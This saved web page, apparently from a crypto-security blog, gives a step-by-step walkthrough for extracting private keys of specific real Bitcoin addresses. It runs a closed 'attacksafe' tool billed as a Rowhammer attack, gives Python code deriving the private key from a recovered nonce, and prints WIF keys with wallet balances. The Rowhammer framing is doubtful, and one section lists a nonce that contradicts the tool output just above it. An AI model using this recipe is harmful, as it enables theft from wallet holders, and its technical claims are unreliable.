<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-168-1024x434.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1311"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0x326428d5b16a180127f67d9dbce5a500e572bf8ff5d7a8840b9704f8bea8fd9c

RawTX = 0100000001e4c6502d4648cd1ae5f2783fe4e8ba449257f0a38b0f8b061ec1cd53e4ba2ade040000006a47304402200a5a38731e8947d567cd82302b8a3a9546215f044ca98b89ea162334bebf781902204eb5aae65c917b18ae6af2b2449bb0ec8c8af4e02c0f68aabba7f509b06c5e390121031702d9ec2144df3030e65465bb96d651ea18c56c90215f4835d86e03d797091affffffff01a8020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0x786a67462e7cfaee1fb5b583518d3f47d750dbf34e9a4434625232cb05cb7efe</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0x326428d5b16a180127f67d9dbce5a500e572bf8ff5d7a8840b9704f8bea8fd9c</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-169-1024x93.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1313"></figure>



<p><code>(0x0a5a38731e8947d567cd82302b8a3a9546215f044ca98b89ea162334bebf7819 , 0x21ef3da06220ca412f63e331d3ad52effee2b6afe4bcbba76380f30abbf91f5b)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x0a5a38731e8947d567cd82302b8a3a9546215f044ca98b89ea162334bebf7819
S = 0x4eb5aae65c917b18ae6af2b2449bb0ec8c8af4e02c0f68aabba7f509b06c5e39
Z = 0xade80ed6e0d32f4cf2ad36e7f2b28e3f0d421de70310d8726f7dd8a2580936a8</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x0a5a38731e8947d567cd82302b8a3a9546215f044ca98b89ea162334bebf7819
point2gen  =   (0x0a5a38731e8947d567cd82302b8a3a9546215f044ca98b89ea162334bebf7819 , 0x21ef3da06220ca412f63e331d3ad52effee2b6afe4bcbba76380f30abbf91f5b)</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0x326428d5b16a180127f67d9dbce5a500e572bf8ff5d7a8840b9704f8bea8fd9c</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x326428d5b16a180127f67d9dbce5a500e572bf8ff5d7a8840b9704f8bea8fd9c
R = 0x0a5a38731e8947d567cd82302b8a3a9546215f044ca98b89ea162334bebf7819
S = 0x4eb5aae65c917b18ae6af2b2449bb0ec8c8af4e02c0f68aabba7f509b06c5e39
Z = 0xade80ed6e0d32f4cf2ad36e7f2b28e3f0d421de70310d8726f7dd8a2580936a8


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-171.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1316"></figure>



<p><code>PrivKey = cdd7729ab894ba334e9a9b55c6bdb8c7e5869c80339ca6bb0ae23faee6af550b</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP
WIF:  L47qg9KCcGYw1WkVKGA6EH6mAdMoD5WwXCT4Gyn8UxLGPbZ14AUz
HEX:  cdd7729ab894ba334e9a9b55c6bdb8c7e5869c80339ca6bb0ae23faee6af550b</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/003-1.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1302"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center"><strong><a href="https://www.blockchain.com/btc/address/14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP" target="_blank" rel="noreferrer noopener">https://www.blockchain.com/btc/address/14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private key Found!</code></p>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-164-1024x446.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1304"><figcaption><strong><a href="https://www.blockchain.com/btc/address/14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP</code></a></strong></figcaption></figure>



<p><code>BALANCE: $ 698.45</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><code>№4</code></strong></p>



<p>With detailed cryptanalysis, we also found a critical vulnerability in Bitcoin Address:</p>



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc" target="_blank" rel="noreferrer noopener">17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc</a></strong></p><p><a href="https://btc1.trezor.io/tx/18dcc93cea01e4bbd41a4e648ca6088fce67bb0a8e2cc231e42978dcdffd1591" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/18dcc93cea01e4bbd41a4e648ca6088fce67bb0a8e2cc231e42978dcdffd1591</a></p><p><a href="https://btc1.trezor.io/tx/17ea9403f628a1810ffa70858dd5411c455fbdc1fd8c7e2048c5e5ae5d2ac839" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/17ea9403f628a1810ffa70858dd5411c455fbdc1fd8c7e2048c5e5ae5d2ac839</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-103-1024x204.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1144"></figure>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-104-1024x204.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1146"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc" target="_blank" rel="noreferrer noopener">17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc</a></strong></p><p><a href="https://btc1.trezor.io/tx/18dcc93cea01e4bbd41a4e648ca6088fce67bb0a8e2cc231e42978dcdffd1591" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/18dcc93cea01e4bbd41a4e648ca6088fce67bb0a8e2cc231e42978dcdffd1591</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-172-1024x95.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1320"></figure>



<pre class="wp-block-code"><code>RawTX = 010000000161d00e5c5d90528fb69e727a481638d109b011c0944e17e21b4a8b06de7086ba1400000069463043021f057a78c3377aa63c69a6b8f85f86ba5ce433198bba2a3f91c64da614952fb702200707ef040813d2693a50dd7458bbf07c07ff28e2233a3adeb81120898d7ee4cd0121027625d44b04d7760766b280d683d3495a0532fd8e931e48cc546bf794286a9defffffffff01d0020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 010000000161d00e5c5d90528fb69e727a481638d109b011c0944e17e21b4a8b06de7086ba1400000069463043021f057a78c3377aa63c69a6b8f85f86ba5ce433198bba2a3f91c64da614952fb702200707ef040813d2693a50dd7458bbf07c07ff28e2233a3adeb81120898d7ee4cd0121027625d44b04d7760766b280d683d3495a0532fd8e931e48cc546bf794286a9defffffffff01d0020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-173-1024x238.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1322"></figure>



<pre class="wp-block-code"><code>R = 0x00057a78c3377aa63c69a6b8f85f86ba5ce433198bba2a3f91c64da614952fb7
S = 0x0707ef040813d2693a50dd7458bbf07c07ff28e2233a3adeb81120898d7ee4cd
Z = 0x6b260e8163bb2a68f5dea232134c0f2ceefe242564dba90632b72b10e0a3a91e</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>010000000161d00e5c5d90528fb69e727a481638d109b011c0944e17e21b4a8b06de7086ba1400000069463043021f057a78c3377aa63c69a6b8f85f86ba5ce433198bba2a3f91c64da614952fb702200707ef040813d2693a50dd7458bbf07c07ff28e2233a3adeb81120898d7ee4cd0121027625d44b04d7760766b280d683d3495a0532fd8e931e48cc546bf794286a9defffffffff01d0020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool rowhammer_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool rowhammer_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-174-1024x295.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1324"></figure>



<p>We launched this attack from&nbsp;<code>-tool rowhammer_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-175-1024x452.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1326"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xe83de16640c70e103fd24d2e10535896054861ba444f659ea17d953490821820

RawTX = 010000000161d00e5c5d90528fb69e727a481638d109b011c0944e17e21b4a8b06de7086ba1400000069463043021f057a78c3377aa63c69a6b8f85f86ba5ce433198bba2a3f91c64da614952fb702200707ef040813d2693a50dd7458bbf07c07ff28e2233a3adeb81120898d7ee4cd0121027625d44b04d7760766b280d683d3495a0532fd8e931e48cc546bf794286a9defffffffff01d0020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0xe83de16640c70e103fd24d2e10535896054861ba444f659ea17d953490821820</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0xe83de16640c70e103fd24d2e10535896054861ba444f659ea17d953490821820</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-176-1024x89.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1328"></figure>



<p><code>(0x00057a78c3377aa63c69a6b8f85f86ba5ce433198bba2a3f91c64da614952fb7 , 0xce504e53221559f480af279f313f5f4913f6b8c317561e570290e3b1b6da0a94)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x00057a78c3377aa63c69a6b8f85f86ba5ce433198bba2a3f91c64da614952fb7
S = 0x0707ef040813d2693a50dd7458bbf07c07ff28e2233a3adeb81120898d7ee4cd
Z = 0x6b260e8163bb2a68f5dea232134c0f2ceefe242564dba90632b72b10e0a3a91e</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x00057a78c3377aa63c69a6b8f85f86ba5ce433198bba2a3f91c64da614952fb7
point2gen  =   (0x00057a78c3377aa63c69a6b8f85f86ba5ce433198bba2a3f91c64da614952fb7 , 0xce504e53221559f480af279f313f5f4913f6b8c317561e570290e3b1b6da0a94)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0xe83de16640c70e103fd24d2e10535896054861ba444f659ea17d953490821820</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xe83de16640c70e103fd24d2e10535896054861ba444f659ea17d953490821820
R = 0x00057a78c3377aa63c69a6b8f85f86ba5ce433198bba2a3f91c64da614952fb7
S = 0x0707ef040813d2693a50dd7458bbf07c07ff28e2233a3adeb81120898d7ee4cd
Z = 0x6b260e8163bb2a68f5dea232134c0f2ceefe242564dba90632b72b10e0a3a91e


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-177.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1330"></figure>



<p><code>PrivKey = e9f6fc4dea68373f7e91348a23086d406621c1af6b7c0f085fb3096f5ae6b5cf</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc
WIF:  L54WQgCucvc7HCQvYSKnKgiqMUXXXvPxEYZbpxFWTeqQQTuAsqhH
HEX:  e9f6fc4dea68373f7e91348a23086d406621c1af6b7c0f085fb3096f5ae6b5cf</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/004.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1332"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center"><strong><a href="https://www.blockchain.com/btc/address/17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc" target="_blank" rel="noreferrer noopener">https://www.blockchain.com/btc/address/17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private key Found!</code></p>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-178-1024x452.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1336"><figcaption><strong><a href="https://www.blockchain.com/btc/address/17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc</code></a></strong></figcaption></figure>



<p><code>BALANCE: $ 679.53</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><em>The potential threat of losing BTC coins lies in the critical vulnerability of the Bitcoin blockchain transaction, so we strongly recommend that everyone always update the software and use only verified devices.</em></p></blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>With detailed cryptanalysis, we also found a critical vulnerability in&nbsp;<strong><a href="https://btc1.trezor.io/tx/17ea9403f628a1810ffa70858dd5411c455fbdc1fd8c7e2048c5e5ae5d2ac839" target="_blank" rel="noreferrer noopener">17ea9403f628a1810ffa70858dd5411c455fbdc1fd8c7e2048c5e5ae5d2ac839</a></strong>&nbsp;for the same Bitcoin Address<strong><code>&nbsp;TXID:</code></strong><strong><a href="https://btc1.trezor.io/tx/17ea9403f628a1810ffa70858dd5411c455fbdc1fd8c7e2048c5e5ae5d2ac839" target="_blank" rel="noreferrer noopener"></a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc" target="_blank" rel="noreferrer noopener">17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc</a></strong></p><p><a href="https://btc1.trezor.io/tx/17ea9403f628a1810ffa70858dd5411c455fbdc1fd8c7e2048c5e5ae5d2ac839" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/17ea9403f628a1810ffa70858dd5411c455fbdc1fd8c7e2048c5e5ae5d2ac839</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-180-1024x97.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1339"></figure>



<pre class="wp-block-code"><code>RawTX = 010000000178dc582ecec1c896cefa5c8207ef549ed7e052f386328530eec78869764bbaa21f0000006b483045022100cb620734c986b2f5ef6d3dbaa72baec6ceb153590553d15c28f57fc809e0c36802205b4f85e04379ca7fc4d48bbf4ed5a204eba9459bcfe042c4fb10f13c76fe87200121027625d44b04d7760766b280d683d3495a0532fd8e931e48cc546bf794286a9defffffffff013a020000000000001976a91464c2de8847e1ab5f767ae5ab8253d7522572ddf888ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 010000000178dc582ecec1c896cefa5c8207ef549ed7e052f386328530eec78869764bbaa21f0000006b483045022100cb620734c986b2f5ef6d3dbaa72baec6ceb153590553d15c28f57fc809e0c36802205b4f85e04379ca7fc4d48bbf4ed5a204eba9459bcfe042c4fb10f13c76fe87200121027625d44b04d7760766b280d683d3495a0532fd8e931e48cc546bf794286a9defffffffff013a020000000000001976a91464c2de8847e1ab5f767ae5ab8253d7522572ddf888ac00000000
</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-181-1024x148.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1341"></figure>



<pre class="wp-block-code"><code>R = 0xcb620734c986b2f5ef6d3dbaa72baec6ceb153590553d15c28f57fc809e0c368
S = 0x5b4f85e04379ca7fc4d48bbf4ed5a204eba9459bcfe042c4fb10f13c76fe8720
Z = 0x5a6c8e71ff1d29ebf721320d373808f66ede9303e09e3715b3e85ce57b92b7c8</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>010000000178dc582ecec1c896cefa5c8207ef549ed7e052f386328530eec78869764bbaa21f0000006b483045022100cb620734c986b2f5ef6d3dbaa72baec6ceb153590553d15c28f57fc809e0c36802205b4f85e04379ca7fc4d48bbf4ed5a204eba9459bcfe042c4fb10f13c76fe87200121027625d44b04d7760766b280d683d3495a0532fd8e931e48cc546bf794286a9defffffffff013a020000000000001976a91464c2de8847e1ab5f767ae5ab8253d7522572ddf888ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool rowhammer_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool rowhammer_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-182-1024x293.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1343"></figure>



<p>We launched this attack from&nbsp;<code>-tool rowhammer_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-183-1024x429.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1344"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0x5cdc6820f6336951f2d9f55b544ed2337804ddaa38249f53e7fc7b176ae67a2a

RawTX = 010000000178dc582ecec1c896cefa5c8207ef549ed7e052f386328530eec78869764bbaa21f0000006b483045022100cb620734c986b2f5ef6d3dbaa72baec6ceb153590553d15c28f57fc809e0c36802205b4f85e04379ca7fc4d48bbf4ed5a204eba9459bcfe042c4fb10f13c76fe87200121027625d44b04d7760766b280d683d3495a0532fd8e931e48cc546bf794286a9defffffffff013a020000000000001976a91464c2de8847e1ab5f767ae5ab8253d7522572ddf888ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0xe83de16640c70e103fd24d2e10535896054861ba444f659ea17d953490821820</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0x5cdc6820f6336951f2d9f55b544ed2337804ddaa38249f53e7fc7b176ae67a2a</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-184-1024x89.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1346"></figure>



<p><code>(0xcb620734c986b2f5ef6d3dbaa72baec6ceb153590553d15c28f57fc809e0c368 , 0x37b895600595d773ef80780fadfb81f34ab997aafdee272e1baf1b199df853a3)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0xcb620734c986b2f5ef6d3dbaa72baec6ceb153590553d15c28f57fc809e0c368
S = 0x5b4f85e04379ca7fc4d48bbf4ed5a204eba9459bcfe042c4fb10f13c76fe8720
Z = 0x5a6c8e71ff1d29ebf721320d373808f66ede9303e09e3715b3e85ce57b92b7c8</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0xcb620734c986b2f5ef6d3dbaa72baec6ceb153590553d15c28f57fc809e0c368
point2gen  =   (0xcb620734c986b2f5ef6d3dbaa72baec6ceb153590553d15c28f57fc809e0c368 , 0x37b895600595d773ef80780fadfb81f34ab997aafdee272e1baf1b199df853a3)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0x5cdc6820f6336951f2d9f55b544ed2337804ddaa38249f53e7fc7b176ae67a2a</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



